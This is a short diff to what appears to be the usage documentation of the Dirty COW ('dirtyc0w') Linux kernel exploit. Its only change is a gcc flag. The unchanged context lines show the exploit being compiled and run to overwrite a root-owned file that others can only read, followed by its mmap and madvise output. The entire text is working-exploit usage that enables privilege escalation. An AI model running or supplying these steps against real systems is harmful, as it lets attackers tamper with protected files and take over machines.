@@ -7,7 +7,7 @@ $ ls -lah foo
 -r-----r-- 1 root root 19 Oct 20 15:23 foo
 $ cat foo
 this is not a test
-$ gcc -lpthread dirtyc0w.c -o dirtyc0w
+$ gcc -pthread dirtyc0w.c -o dirtyc0w
 $ ./dirtyc0w foo m00000000000000000
 mmap 56123000
 madvise 0
